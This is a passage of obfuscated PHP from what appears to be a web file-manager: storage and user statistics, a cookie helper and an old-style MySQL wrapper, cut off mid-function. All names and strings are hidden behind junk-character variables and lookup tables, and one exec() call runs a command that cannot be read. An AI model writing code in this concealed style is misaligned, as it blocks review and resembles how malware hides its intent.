$º÷›«õ[368]) { $ï¹õÒÜë[$º÷›«õ[1811]] = $º÷›«õ[119]; } $this->update(); } public function copyFileEnd($Ëéò¾¢ë, $öıˆ±í‚, $É“Èõ¤î, $‚ı§ó™¸, $ìÚò»ßö, $æËõ¤) { $ ¢¤ì— =& $_SERVER[•€áå–Õ]; $×Ò¿ˆÔ =& $this->task; $×Ò¿ˆÔ[$ ¢¤ì—[1747]] = $×Ò¿ˆÔ[$ ¢¤ì—[1746]]; $×Ò¿ˆÔ[$ ¢¤ì—[1751]] += $×Ò¿ˆÔ[$ ¢¤ì—[1746]]; $×Ò¿ˆÔ[$ ¢¤ì—[1748]] = $ ¢¤ì—[22]; $this->update(); } public function zipEvent($ô·Ğ—Äù, $Õ˜Œô³, $é‰Â¦œ›, $ËÈ¾¢Êİ) { $î”­ÈÖ =& $_SERVER[•€áå–Õ]; $ºƒÒ°©º =& $this->task; $ºƒÒ°©º[$î”­ÈÖ[1744]] = get_path_this($Õ˜Œô³); $ºƒÒ°©º[$î”­ÈÖ[1746]] = $ËÈ¾¢Êİ; $ºƒÒ°©º[$î”­ÈÖ[1747]] = $é‰Â¦œ›; $ºƒÒ°©º[$î”­ÈÖ[1105]] = $ô·Ğ—Äù == $î”­ÈÖ[1819] ? $î”­ÈÖ[1814] : $î”­ÈÖ[1815]; $ºƒÒ°©º[$î”­ÈÖ[1748]] = $î”­ÈÖ[22]; $ºƒÒ°©º[$î”­ÈÖ[804]] = $ËÈ¾¢Êİ; $ºƒÒ°©º[$î”­ÈÖ[1811]] = $î”­ÈÖ[368]; $this->update(); } public function nameParse($å“öÂˆí) { $ı«¾¾¿ =& $_SERVER[•€áå–Õ]; $·›°–Œ¼ =& $this->task; if ($·›°–Œ¼[$ı«¾¾¿[1694]] < $·›°–Œ¼[$ı«¾¾¿[827]]) { $ŸÖã¬óí = get_path_this($å“öÂˆí); if (strstr($ŸÖã¬óí, $ı«¾¾¿[20])) { $·›°–Œ¼[$ı«¾¾¿[1694]] += 1; } } if ($·›°–Œ¼[$ı«¾¾¿[1811]] == $ı«¾¾¿[1235]) { $·›°–Œ¼[$ı«¾¾¿[1811]] = $ı«¾¾¿[368]; } $·›°–Œ¼[$ı«¾¾¿[1744]] = $å“öÂˆí; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¦¢­ÇÇ) { $¿…’•— =& $_SERVER[•€áå–Õ]; $Ãé×¯œ´ = array($¿…’•—[641] => array($¿…’•—[43] => $¿…’•—[1820], $¿…’•—[328] => array($¿…’•—[251], $¿…’•—[806], $¿…’•—[1821], $¿…’•—[1822])), $¿…’•—[1823] => array($¿…’•—[43] => $¿…’•—[1824], $¿…’•—[328] => array($¿…’•—[251], $¿…’•—[804], $¿…’•—[1825], $¿…’•—[1826], $¿…’•—[1827]))); if (!isset($Ãé×¯œ´[$¦¢­ÇÇ])) { return !1; } $this->optionType = $Ãé×¯œ´[$¦¢­ÇÇ][$¿…’•—[43]]; $this->field = $Ãé×¯œ´[$¦¢­ÇÇ][$¿…’•—[328]]; return !0; } public function listData($µƒù­Š§ = false, $£›÷¨Õù = "\x6d\157\x64\151\x66\171\124\x69\x6d\145", $šÑùúé­ = false) { return parent::listData($µƒù­Š§, $£›÷¨Õù, $šÑùúé­); } public function trendList($—šÒÎ±¦) { $ÀÂ¹Éœë =& $_SERVER[•€áå–Õ]; $ÆÈ¯Ğòô = $this->listData(); if ($ÆÈ¯Ğòô) { $ğÒš¢½® = end($ÆÈ¯Ğòô); $Ø€¶Àß© = date($ÀÂ¹Éœë[1828], strtotime($ÀÂ¹Éœë[1829])); if ($ğÒš¢½®[$ÀÂ¹Éœë[251]] == $Ø€¶Àß©) { return $ÆÈ¯Ğòô; } $Ôğ´øäÚ = strtotime($ğÒš¢½®[$ÀÂ¹Éœë[251]]); } if (!isset($Ôğ´øäÚ)) { $Ş°€²ü† = $—šÒÎ±¦ == $ÀÂ¹Éœë[641] ? $ÀÂ¹Éœë[578] : $ÀÂ¹Éœë[866]; $Ôğ´øäÚ = Model($Ş°€²ü†)->min($ÀÂ¹Éœë[227]); } $¸Ø…Ö­é = $ÀÂ¹Éœë[1830] . ucfirst($—šÒÎ±¦); $ı®‹ä†§ = $this->dateList($Ôğ´øäÚ); foreach ($ı®‹ä†§ as $Ø€¶Àß©) { $this->{$¸Ø…Ö­é}($Ø€¶Àß©); } return $this->listData(); } private function dateList($ü…¨··†) { $´À¹­ú… =& $_SERVER[•€áå–Õ]; $Óªòşó¸ = $ü…¨··†; $á¶‚°êô = strtotime($´À¹­ú…[1829]); $¿œ„Ù  = array(); while ($Óªòşó¸ <= $á¶‚°êô) { $¿œ„Ù [] = date($´À¹­ú…[1828], $Óªòşó¸); $Óªòşó¸ = strtotime($´À¹­ú…[1831], $Óªòşó¸); } return $¿œ„Ù ; } public function _recordUser($½Ğ÷ÄñË = '') { $î’‡ÅÃ =& $_SERVER[•€áå–Õ]; $»¢üäŠô = strtotime(date($î’‡ÅÃ[1832], strtotime($½Ğ÷ÄñË))); $Öß³œØï = strtotime(date($î’‡ÅÃ[1833], strtotime($½Ğ÷ÄñË))); $—’ÊÚÓı = array($î’‡ÅÃ[227] => array($î’‡ÅÃ[1054], $Öß³œØï)); $Ğ©¿ûÅ‡ = Model($î’‡ÅÃ[578])->where($—’ÊÚÓı)->count($î’‡ÅÃ[1693]); $—’ÊÚÓı[$î’‡ÅÃ[227]] = array($î’‡ÅÃ[388], array($»¢üäŠô, $Öß³œØï)); $Ş¾ƒË›ß = Model($î’‡ÅÃ[578])->where($—’ÊÚÓı)->count($î’‡ÅÃ[1693]); $—’ÊÚÓı[$î’‡ÅÃ[43]] = $î’‡ÅÃ[1834]; $ÊÉÑÒ“Ğ = Model($î’‡ÅÃ[1835])->where($—’ÊÚÓı)->count($î’‡ÅÃ[1836]); $—ÉÍğ÷ = array($î’‡ÅÃ[251] => $½Ğ÷ÄñË, $î’‡ÅÃ[806] => (int) $Ğ©¿ûÅ‡, $î’‡ÅÃ[1821] => (int) $Ş¾ƒË›ß, $î’‡ÅÃ[1822] => (int) $ÊÉÑÒ“Ğ); return $this->insert($—ÉÍğ÷); } public function _recordStore($¨æê“¦“ = '') { $µ´¯‚£ş =& $_SERVER[•€áå–Õ]; $«½ïÆ½ = strtotime(date($µ´¯‚£ş[1833], strtotime($¨æê“¦“))); $À–Ğ´êĞ = array($µ´¯‚£ş[227] => array($µ´¯‚£ş[1054], $«½ïÆ½)); $£Òïì×¤ = Model($µ´¯‚£ş[523])->where($À–Ğ´êĞ)->sum($µ´¯‚£ş[88]); $À–Ğ´êĞ[$µ´¯‚£ş[464]] = 0; $Øçè«Îµ = Model($µ´¯‚£ş[866])->where($À–Ğ´êĞ)->sum($µ´¯‚£ş[88]); $À–Ğ´êĞ[$µ´¯‚£ş[190]] = 1; $¦ı–Ì¢ = Model($µ´¯‚£ş[866])->where($À–Ğ´êĞ)->sum($µ´¯‚£ş[88]); $À–Ğ´êĞ[$µ´¯‚£ş[190]] = 2; $ëÇØµßµ = Model($µ´¯‚£ş[866])->where($À–Ğ´êĞ)->sum($µ´¯‚£ş[88]); $ó©ÏÚª„ = array($µ´¯‚£ş[251] => $¨æê“¦“, $µ´¯‚£ş[804] => (int) $Øçè«Îµ, $µ´¯‚£ş[1825] => (int) $£Òïì×¤, $µ´¯‚£ş[1826] => (int) $¦ı–Ì¢, $µ´¯‚£ş[1827] => (int) $ëÇØµßµ); return $this->insert($ó©ÏÚª„); } public function trend($µû°·—†, $º…ÎèÏõ) { $¼‰”¤â‡ =& $_SERVER[•€áå–Õ]; if (!$this->init($µû°·—†)) { return !1; } $êÌ’İµœ = $this->trendList($µû°·—†); if ($êÌ’İµœ && $º…ÎèÏõ != $¼‰”¤â‡[1666]) { $ñ“°½¤¶ = $êÌ’İµœ[0][$¼‰”¤â‡[251]]; $Ñ¸½Àó = $this->validDate($º…ÎèÏõ, $ñ“°½¤¶); $”Ñ“Å†Ô = array(); $ìº÷±ø˜ = array_to_keyvalue($êÌ’İµœ, $¼‰”¤â‡[251]); foreach ($Ñ¸½Àó as $»Ò½ºô) { if (isset($ìº÷±ø˜[$»Ò½ºô])) { $…€šß¼ş = $ìº÷±ø˜[$»Ò½ºô]; } else { $…€šß¼ş = end($êÌ’İµœ); $…€šß¼ş[$¼‰”¤â‡[251]] = $»Ò½ºô; if ($µû°·—† == $¼‰”¤â‡[641]) { $…€šß¼ş[$¼‰”¤â‡[1821]] = $…€šß¼ş[$¼‰”¤â‡[1822]] = 0; } } $”Ñ“Å†Ô[] = $…€šß¼ş; } $êÌ’İµœ = $”Ñ“Å†Ô; } $÷¥ËéÛ‰ = array($¼‰”¤â‡[641] => array($¼‰”¤â‡[806] => LNG($¼‰”¤â‡[1837]), $¼‰”¤â‡[1821] => LNG($¼‰”¤â‡[1838]), $¼‰”¤â‡[1822] => LNG($¼‰”¤â‡[1839])), $¼‰”¤â‡[1823] => array($¼‰”¤â‡[804] => LNG($¼‰”¤â‡[1840]), $¼‰”¤â‡[1825] => LNG($¼‰”¤â‡[1841]), $¼‰”¤â‡[1826] => LNG($¼‰”¤â‡[1842]), $¼‰”¤â‡[1827] => LNG($¼‰”¤â‡[1843]))); $®ƒŸÓ´ = array($¼‰”¤â‡[641] => $¼‰”¤â‡[1844], $¼‰”¤â‡[1823] => $¼‰”¤â‡[88]); if (empty($êÌ’İµœ)) { $»Ò½ºô = date($¼‰”¤â‡[1828], strtotime($¼‰”¤â‡[1829])); $·ÁÃ’‚ğ = array($¼‰”¤â‡[251] => $»Ò½ºô); foreach ($÷¥ËéÛ‰[$µû°·—†] as $Ò¿¿È€å => $ëåñµ–Ğ) { $·ÁÃ’‚ğ[$Ò¿¿È€å] = 0; } $êÌ’İµœ[] = $·ÁÃ’‚ğ; } $›ùëé = array(); foreach ($êÌ’İµœ as $ëåñµ–Ğ) { if ($µû°·—† == $¼‰”¤â‡[1823] && $ëåñµ–Ğ[$¼‰”¤â‡[1825]] > $ëåñµ–Ğ[$¼‰”¤â‡[804]]) { $ëåñµ–Ğ[$¼‰”¤â‡[1825]] = $ëåñµ–Ğ[$¼‰”¤â‡[804]]; } foreach ($÷¥ËéÛ‰[$µû°·—†] as $Ò¿¿È€å => $Óù×ÍœÙ) { $…€šß¼ş = array($¼‰”¤â‡[251] => $ëåñµ–Ğ[$¼‰”¤â‡[251]], $¼‰”¤â‡[1583] => $Óù×ÍœÙ); $…€šß¼ş[$®ƒŸÓ´[$µû°·—†]] = isset($ëåñµ–Ğ[$Ò¿¿È€å]) ? $ëåñµ–Ğ[$Ò¿¿È€å] : 0; $›ùëé[] = $…€šß¼ş; } } return $›ùëé; } public function validDate($›êÇİï, $ç„§„ïŸ) { $ôíÅÃ´¬ =& $_SERVER[•€áå–Õ]; $ß—İ¤· = date($ôíÅÃ´¬[1828], strtotime($ôíÅÃ´¬[1829])); $ÉÓêêæÒ = array($ß—İ¤·); switch ($›êÇİï) { case $ôíÅÃ´¬[1673]: $˜ƒ–—Ä¯ = mktime(0, 0, 0, date($ôíÅÃ´¬[1845]), date($ôíÅÃ´¬[1402]) - date($ôíÅÃ´¬[1467]) + 7 - 7, date($ôíÅÃ´¬[1846])); $‘Äîú“ã = 0; do { $ì×ÌŞü = date($ôíÅÃ´¬[1828], $˜ƒ–—Ä¯ - 3600 * 24 * 7 * $‘Äîú“ã); $ÉÓêêæÒ[] = $ì×ÌŞü; $‘Äîú“ã++; } while ($ç„§„ïŸ < $ì×ÌŞü); break; case $ôíÅÃ´¬[1671]: $‘Äîú“ã = 1; do { $˜öùı®Ï = date($ôíÅÃ´¬[1847], strtotime("\x2d\x20{$‘Äîú“ã}\40\x6d\157\156\164\x68\x73")); $ÉÓêêæÒ[] = $˜öùı®Ï; $‘Äîú“ã++; } while ($ç„§„ïŸ < $˜öùı®Ï); break; case $ôíÅÃ´¬[1848]: $àÅ®ºĞä = (int) date($ôíÅÃ´¬[1846], strtotime($ç„§„ïŸ)); $í¿™ª½ = (int) date($ôíÅÃ´¬[1846]); if ($àÅ®ºĞä >= $í¿™ª½) { break; } for ($àÅ®ºĞä; $àÅ®ºĞä < $í¿™ª½; $àÅ®ºĞä++) { $ÉÓêêæÒ[] = $àÅ®ºĞä . $ôíÅÃ´¬[1849]; } break; default: break; } if ($ç„§„ïŸ > end($ÉÓêêæÒ)) { array_pop($ÉÓêêæÒ); } sort($ÉÓêêæÒ); return $ÉÓêêæÒ; } public function listTable($ßº£ãšÜ) { $Ò‰Ë‰ô¾ = ucfirst($ßº£ãšÜ); return Model($Ò‰Ë‰ô¾)->listData(); } public function option($´ÛÄÊæö) { $£Êáı×ğ = $_SERVER[•€áå–Õ][1850] . ucfirst($´ÛÄÊæö); return $this->{$£Êáı×ğ}(); } private function optionUser() { $úíôëÄ‡ =& $_SERVER[•€áå–Õ]; $‚¥§šÅØ = Model($úíôëÄ‡[578])->count($úíôëÄ‡[1693]); $½Ù•Õ« = Model($úíôëÄ‡[578])->where($úíôëÄ‡[1851])->count($úíôëÄ‡[1693]); $ş²€Ÿ½… = intval($GLOBALS[$úíôëÄ‡[16]][$úíôëÄ‡[404]][$úíôëÄ‡[1639]]) / 3600; $…ñ¼ôÑ = strtotime("\55{$ş²€Ÿ½…}\x20\x68\x6f\165\162\163"); $¡èÔüÃñ = strtotime(date($úíôëÄ‡[1832])); if ($…ñ¼ôÑ < $¡èÔüÃñ) { $…ñ¼ôÑ = $¡èÔüÃñ; } $¯£‹ ¡Ó = array($úíôëÄ‡[1852] => array($úíôëÄ‡[1055], $…ñ¼ôÑ)); $‘ß™ó–‹ = (int) Model($úíôëÄ‡[578])->where($¯£‹ ¡Ó)->count($úíôëÄ‡[1693]); if (!$‘ß™ó–‹) { $‘ß™ó–‹ = 1; } $¯£‹ ¡Ó = array($úíôëÄ‡[1852] => array($úíôëÄ‡[1055], $¡èÔüÃñ)); $ÛØÒ¥×Ÿ = Model($úíôëÄ‡[578])->where($¯£‹ ¡Ó)->count($úíôëÄ‡[1693]); return array($úíôëÄ‡[799] => (int) $‚¥§šÅØ, $úíôëÄ‡[1853] => (int) ($‚¥§šÅØ - $½Ù•Õ«), $úíôëÄ‡[1854] => (int) $½Ù•Õ«, $úíôëÄ‡[1855] => (int) $ÛØÒ¥×Ÿ, $úíôëÄ‡[1856] => $‘ß™ó–‹); } private function optionFile() { $÷÷× Ïã =& $_SERVER[•€áå–Õ]; $«Ğ³ğ£¸ = $this->sourceSize(); $ ùØÉ÷ß = $«Ğ³ğ£¸[$÷÷× Ïã[88]]; $ÌÍ¯öò• = $«Ğ³ğ£¸[$÷÷× Ïã[1825]]; $õ£¦óüˆ = Model($÷÷× Ïã[866])->where(array($÷÷× Ïã[464] => 0))->count($÷÷× Ïã[193]); $ıÁ®˜«” = array($÷÷× Ïã[464] => 0, $÷÷× Ïã[227] => array($÷÷× Ïã[1055], strtotime(date($÷÷× Ïã[1832])))); $ûËÓìÛÅ = Model($÷÷× Ïã[866])->where($ıÁ®˜«”)->sum($÷÷× Ïã[88]); $²Ó¿Ò¬÷ = Model($÷÷× Ïã[866])->where($ıÁ®˜«”)->count($÷÷× Ïã[193]); return array($÷÷× Ïã[804] => $ ùØÉ÷ß, $÷÷× Ïã[1825] => $ÌÍ¯öò•, $÷÷× Ïã[1857] => $ ùØÉ÷ß - $ÌÍ¯öò•, $÷÷× Ïã[1858] => (int) $ûËÓìÛÅ, $÷÷× Ïã[806] => (int) $õ£¦óüˆ, $÷÷× Ïã[1859] => (int) $²Ó¿Ò¬÷); } private function optionAccess() { $àùãıñ =& $_SERVER[•€áå–Õ]; return array($àùãıñ[799] => $this->typeLogCnt(), $àùãıñ[119] => $this->typeLogCnt($àùãıñ[119]), $àùãıñ[504] => $this->typeLogCnt($àùãıñ[504]), $àùãıñ[1860] => $this->typeLogCnt($àùãıñ[1860]), $àùãıñ[1861] => $this->typeLogCnt($àùãıñ[1861]), $àùãıñ[641] => $this->typeLogCnt($àùãıñ[22], $àùãıñ[1836])); } private function typeLogCnt($Î‰×°á¹ = '', $æËôÖõ– = "\x69\x64") { $á’şÍÄ¼ =& $_SERVER[•€áå–Õ]; $åÖÜÛú‚ = array($á’şÍÄ¼[119] => array($á’şÍÄ¼[1862], $á’şÍÄ¼[1863]), $á’şÍÄ¼[504] => array($á’şÍÄ¼[1864], $á’şÍÄ¼[1865]), $á’şÍÄ¼[1860] => array($á’şÍÄ¼[1866], $á’şÍÄ¼[1867], $á’şÍÄ¼[1868]), $á’şÍÄ¼[1861] => array($á’şÍÄ¼[1869], $á’şÍÄ¼[1870]), $á’şÍÄ¼[1871] => array($á’şÍÄ¼[1872], $á’şÍÄ¼[1873], $á’şÍÄ¼[1874])); $„²Œó©€ = strtotime(date($á’şÍÄ¼[1832])); $â»®×Øñ = array($á’şÍÄ¼[227] => array($á’şÍÄ¼[1055], $„²Œó©€)); if ($Î‰×°á¹) { $â»®×Øñ[$á’şÍÄ¼[43]] = array($á’şÍÄ¼[17], $åÖÜÛú‚[$Î‰×°á¹]); } $ˆìÀ×ÍÛ = Model($á’şÍÄ¼[1835])->where($â»®×Øñ)->count($æËôÖõ–); return (int) $ˆìÀ×ÍÛ; } private function optionServer() { $Ò§½Î…ú =& $_SERVER[•€áå–Õ]; $Óæ€ˆ¬× = $this->diskDriver(); $ÇÓŞ™ = KodIO::defaultDriver(); $¸¯ŒÜ—Ò = array($Ò§½Î…ú[858] => $ÇÓŞ™[$Ò§½Î…ú[454]]); $ï£Äø¿û = Model($Ò§½Î…ú[523])->where($¸¯ŒÜ—Ò)->sum($Ò§½Î…ú[88]); $ÏèëÛÕÊ = explode($Ò§½Î…ú[63], $_SERVER[$Ò§½Î…ú[156]]); $½ëÆË© = $ÏèëÛÕÊ[0]; $¡‡÷»ÆÉ = $GLOBALS[$Ò§½Î…ú[16]][$Ò§½Î…ú[31]]; $€¤À‘× = $¡‡÷»ÆÉ[$Ò§½Î…ú[1017]]; if ($€¤À‘× == $Ò§½Î…ú[1005]) { $Â¦üìúÂ = explode($Ò§½Î…ú[1323], $¡‡÷»ÆÉ[$Ò§½Î…ú[1016]]); $€¤À‘× = $Â¦üìúÂ[0]; } if ($€¤À‘× == $Ò§½Î…ú[953] || $€¤À‘× == $Ò§½Î…ú[845]) { $şéè–Œê = Model()->db()->query($Ò§½Î…ú[1875]); $ø¥ÕÀò… = $şéè–Œê[0] && isset($şéè–Œê[0][$Ò§½Î…ú[1582]]) ? $şéè–Œê[0][$Ò§½Î…ú[1582]] : 0; $€¤À‘× = $Ò§½Î…ú[1876] . ($ø¥ÕÀò… ? $Ò§½Î…ú[18] . $ø¥ÕÀò… : $Ò§½Î…ú[22]); } $ÄÕšÕ‹³ = $GLOBALS[$Ò§½Î…ú[16]][$Ò§½Î…ú[404]][$Ò§½Î…ú[868]]; return array($Ò§½Î…ú[1877] => $Óæ€ˆ¬× ? $Óæ€ˆ¬×[$Ò§½Î…ú[1878]] : 0, $Ò§½Î…ú[1879] => $Óæ€ˆ¬× ? $Óæ€ˆ¬×[$Ò§½Î…ú[1880]] : 0, $Ò§½Î…ú[1881] => (int) $ÇÓŞ™[$Ò§½Î…ú[1878]] * 1024 * 1024 * 1024, $Ò§½Î…ú[1882] => (int) $ï£Äø¿û, $Ò§½Î…ú[1883] => ucfirst($½ëÆË©), $Ò§½Î…ú[1884] => $Ò§½Î…ú[1885] . PHP_VERSION, $Ò§½Î…ú[1886] => phpBuild64() ? 64 : 32, $Ò§½Î…ú[798] => str_replace($Ò§½Î…ú[1171], $Ò§½Î…ú[1033], $€¤À‘×), $Ò§½Î…ú[404] => ucfirst($ÄÕšÕ‹³), $Ò§½Î…ú[42] => $_SERVER[$Ò§½Î…ú[1887]]); } private function diskDriver() { $ÏÊÜ©¶Á =& $_SERVER[•€áå–Õ]; $Ü‡îæ‰İ = $ÏÊÜ©¶Á[18]; $¹Ñäã€œ = $GLOBALS[$ÏÊÜ©¶Á[16]][$ÏÊÜ©¶Á[1340]] == $ÏÊÜ©¶Á[1341]; if ($¹Ñäã€œ) { $Ü‡îæ‰İ = $ÏÊÜ©¶Á[1888]; if (function_exists($ÏÊÜ©¶Á[1889])) { exec($ÏÊÜ©¶Á[1890], $­·ù‹ÅÖ); $Ü‡îæ‰İ = $­·ù‹ÅÖ[1] . $ÏÊÜ©¶Á[18]; } } if (!file_exists($Ü‡îæ‰İ)) { return; } $üä”§éû = @disk_total_space($Ü‡îæ‰İ); $‡È‡é€Ì = $üä”§éû - @disk_free_space($Ü‡îæ‰İ); return array($ÏÊÜ©¶Á[1878] => $üä”§éû, $ÏÊÜ©¶Á[1880] => $‡È‡é€Ì); } public function fileChart($™İş‘€µ) { $Ñª«Àá· =& $_SERVER[•€áå–Õ]; if (isset($™İş‘€µ[$Ñª«Àá·[1693]])) { return Model($Ñª«Àá·[866])->userFileTypeProfile($™İş‘€µ[$Ñª«Àá·[1693]]); } if (isset($™İş‘€µ[$Ñª«Àá·[1891]])) { return Model($Ñª«Àá·[866])->groupFileTypeProfile($™İş‘€µ[$Ñª«Àá·[1891]]); } $ş¤ãÀ£À = $this->sourceSize(); $æ‚ÜöîÇ = array($Ñª«Àá·[192] => 0, $Ñª«Àá·[190] => 1); $´ï†‚Ã = Model($Ñª«Àá·[866])->where($æ‚ÜöîÇ)->sum($Ñª«Àá·[88]); $æ‚ÜöîÇ[$Ñª«Àá·[190]] = 2; $íõÆüÓÇ = Model($Ñª«Àá·[866])->where($æ‚ÜöîÇ)->sum($Ñª«Àá·[88]); return array($Ñª«Àá·[804] => $ş¤ãÀ£À[$Ñª«Àá·[88]], $Ñª«Àá·[1825] => $ş¤ãÀ£À[$Ñª«Àá·[1825]], $Ñª«Àá·[1826] => (int) $´ï†‚Ã, $Ñª«Àá·[1827] => (int) $íõÆüÓÇ); } private function sourceSize() { $›¯á•¼ã =& $_SERVER[•€áå–Õ]; $ûšˆ¸Ãæ = Model($›¯á•¼ã[866])->where(array($›¯á•¼ã[464] => 0))->sum($›¯á•¼ã[88]); $ìÓ¦§Ç = Model($›¯á•¼ã[523])->sum($›¯á•¼ã[88]); if ($ìÓ¦§Ç > $ûšˆ¸Ãæ) { $ìÓ¦§Ç = $ûšˆ¸Ãæ; } return array($›¯á•¼ã[88] => (int) $ûšˆ¸Ãæ, $›¯á•¼ã[1825] => (int) $ìÓ¦§Ç); } } goto eí”“ÔóÁ; eöäêƒ©™‘: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¢ß­äîÇ = '', $Ò½¼  = 0) { if (is_string($¢ß­äîÇ) && $¢ß­äîÇ != $_SERVER[•€áå–Õ][22]) { $this->prefix = $¢ß­äîÇ; } if (is_numeric($Ò½¼ ) && $Ò½¼  > 0) { $this->expire = $Ò½¼ ; } } public static function getInstance() { static $àåÛõœğ; if ($àåÛõœğ === null) { $àåÛõœğ = new self(); } return $àåÛõœğ; } private static $cookieDisable = false; public static function disable($³­÷éú) { self::$cookieDisable = $³­÷éú; } private static $sameCookieSet = array(); public static function set($–ˆ°Ÿ”¤, $ƒ—§ò¡, $ù³îÜıá = 0, $ß„—íÇ¿ = false, $¿‰•ğá’ = false) { $õ¡‚ê‡Ï =& $_SERVER[•€áå–Õ]; if (self::$cookieDisable) { return; } if (!$ù³îÜıá) { $ù³îÜıá = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$–ˆ°Ÿ”¤]) && self::$sameCookieSet[$–ˆ°Ÿ”¤] == $ƒ—§ò¡ . $ù³îÜıá) { return; } self::$sameCookieSet[$–ˆ°Ÿ”¤] = $ƒ—§ò¡ . $ù³îÜıá; if (!$¿‰•ğá’) { $¿‰•ğá’ = str_replace(HOST, $õ¡‚ê‡Ï[22], APP_HOST); $¿‰•ğá’ = _get($GLOBALS, $õ¡‚ê‡Ï[923], $¿‰•ğá’); } $’Â‹ÇÎ = $õ¡‚ê‡Ï[22]; setcookie($–ˆ°Ÿ”¤, $ƒ—§ò¡, time() + $ù³îÜıá, $õ¡‚ê‡Ï[18] . trim($¿‰•ğá’, $õ¡‚ê‡Ï[18]) . $’Â‹ÇÎ, !1, !1, $ß„—íÇ¿); } public static function setSafe($Ú†ÇÇÑ±, $éá¿§Óı, $¾ø¹ï = 0) { self::set($Ú†ÇÇÑ±, $éá¿§Óı, $¾ø¹ï, !0); } public static function get($»¥²Ë) { static $Æ¤¦º…Ş = false; if (!$Æ¤¦º…Ş) { self::initHeaderCookie(); $Æ¤¦º…Ş = !0; } return isset($_COOKIE[$»¥²Ë]) ? $_COOKIE[$»¥²Ë] : !1; } private static function initHeaderCookie() { $¼¿µŸÕú =& $_SERVER[•€áå–Õ]; if (!isset($_SERVER[$¼¿µŸÕú[924]]) || !$_SERVER[$¼¿µŸÕú[924]]) { return; } $‡–“Ê÷€ = explode($¼¿µŸÕú[83], $_SERVER[$¼¿µŸÕú[924]]); foreach ($‡–“Ê÷€ as $ÌÓ°«ª¦) { $ÌÓ°«ª¦ = explode($¼¿µŸÕú[925], $ÌÓ°«ª¦); if (count($ÌÓ°«ª¦) != 2 || !isset($ÌÓ°«ª¦[1])) { continue; } $_COOKIE[trim($ÌÓ°«ª¦[0])] = trim($ÌÓ°«ª¦[1]); } } public static function remove($Û£ŒŸ©ğ, $Åß•åæ× = false) { unset($_COOKIE[$Û£ŒŸ©ğ]); self::set($Û£ŒŸ©ğ, $_SERVER[•€áå–Õ][22], 1, $Åß•åæ×); } } class DbMysql extends Db { public function __construct($Ù‹¦Ÿï› = '') { $¡øİÎ‹Á =& $_SERVER[•€áå–Õ]; if (!extension_loaded($¡øİÎ‹Á[845])) { think_exception(think_lang($¡øİÎ‹Á[24]) . $¡øİÎ‹Á[926]); } if (!empty($Ù‹¦Ÿï›)) { $this->config = $Ù‹¦Ÿï›; if (empty($this->config[$¡øİÎ‹Á[27]])) { $this->config[$¡øİÎ‹Á[27]] = $¡øİÎ‹Á[22]; } } } public function connect($¢¾ˆ—§õ = '', $Ğ÷ÚïîÕ = 0, $Å„Î“Íñ = false) { $’ŞË±Üº =& $_SERVER[•€áå–Õ]; if (!isset($this->linkID[$Ğ÷ÚïîÕ])) { if (empty($¢¾ˆ—§õ)) { $¢¾ˆ—§õ = $this->config; } $¤¾»éõí = $¢¾ˆ—§õ[$’ŞË±Üº[927]] . ($¢¾ˆ—§õ[$’ŞË±Üº[928]] ? "\x3a{$¢¾ˆ—§õ[$’ŞË±Üº[928]]}" : $’ŞË±Üº[22]); $¸ôÀòóÈ = !empty($¢¾ˆ—§õ[$’ŞË±Üº[27]][$’ŞË±Üº[28]]) ? $¢¾ˆ—§õ[$’ŞË±Üº[27]][$’ŞË±Üº[28]] : $this->pconnect; if ($¸ôÀòóÈ) { $this->linkID[$Ğ÷ÚïîÕ] = mysql_pconnect($¤¾»éõí, $¢¾ˆ—§õ[$’ŞË±Üº[929]], $¢¾ˆ—§õ[$’ŞË±Üº[930]], 131072); } else { $this->linkID[$Ğ÷ÚïîÕ] = mysql_connect($¤¾»éõí, $¢¾ˆ—§õ[$’ŞË±Üº[929]], $¢¾ˆ—§õ[$’ŞË±Üº[930]], !0, 131072); } if (!$this->linkID[$Ğ÷ÚïîÕ] || !empty($¢¾ˆ—§õ[$’ŞË±Üº[31]]) && !mysql_select_db($¢¾ˆ—§õ[$’ŞË±Üº[31]], $this->linkID[$Ğ÷ÚïîÕ])) { think_exception(mysql_error()); } $Øæ‡Õ‡– = mysql_get_server_info($this->linkID[$Ğ÷ÚïîÕ]); mysql_query($’ŞË±Üº[931] . think_config($’ŞË±Üº[932]) . $’ŞË±Üº[68], $this->linkID[$Ğ÷ÚïîÕ]); if ($Øæ‡Õ‡– > $’ŞË±Üº[933]) { mysql_query($’ŞË±Üº[934], $this->linkID[$Ğ÷ÚïîÕ]); } $this->connected = !0; if (1 != think_config($’ŞË±Üº[32])) { unset($this->config); } } return $this->linkID[$Ğ÷ÚïîÕ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Ë¿öÁ´ˆ) { $¡æ¥ÂÄ¦ =& $_SERVER[•€áå–Õ]; if (0 === stripos($Ë¿öÁ´ˆ, $¡æ¥ÂÄ¦[319])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ë¿öÁ´ˆ; if ($this->queryID) { $this->free(); } think_action_status($¡æ¥ÂÄ¦[33], 1); think_status($¡æ¥ÂÄ¦[34]); $this->queryID = mysql_query($Ë¿öÁ´ˆ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($äò×­€®) { $Æã©ê¿å =& $_SERVER[•€áå–Õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $äò×­€®; if ($this->queryID) { $this->free(); } think_action_status($Æã©ê¿å[35], 1); think_status($Æã©ê¿å[34]); $ı›àŸâê = mysql_query($äò×­€®, $this->_linkID); $this->debug(); if (!1 === $ı›àŸâê) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[•€áå–Õ][935], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $îïÀ† © = mysql_query($_SERVER[•€áå–Õ][936], $this->_linkID); $this->transTimes = 0; if (!$îïÀ† ©) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ó©º®” = mysql_query($_SERVER[•€áå–Õ][937], $this->_linkID); $this->transTimes = 0; if (!$Ó©º®”) { $this->error(); return 